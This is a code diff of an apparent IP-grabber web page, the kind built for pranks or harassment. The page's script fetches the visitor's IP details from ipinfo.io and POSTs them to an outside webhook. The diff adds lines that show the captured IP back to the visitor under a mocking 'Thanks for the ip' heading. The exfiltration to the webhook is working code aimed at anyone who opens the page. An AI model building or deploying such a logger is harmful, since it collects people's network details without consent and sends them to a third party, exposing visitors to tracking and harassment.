@@ -7,6 +7,8 @@ const request = async () => {
     const response = await fetch('https://ipinfo.io/json');
     const data = await response.json();
 
+    document.getElementById("ip").innerHTML = data.ip;
+
     var postRequest = new XMLHttpRequest();
     postRequest.open("POST", webHookUrl);
 
@@ -26,5 +28,6 @@ request();
 
         </script>
         <h1 style="font-family:'Comic Sans MS'">Thanks for the ip lmao bozo epic poggers</h1>
+        <h1 style="font-family:'Comic Sans MS'" id="ip"></h1>
     </body>
 </html>
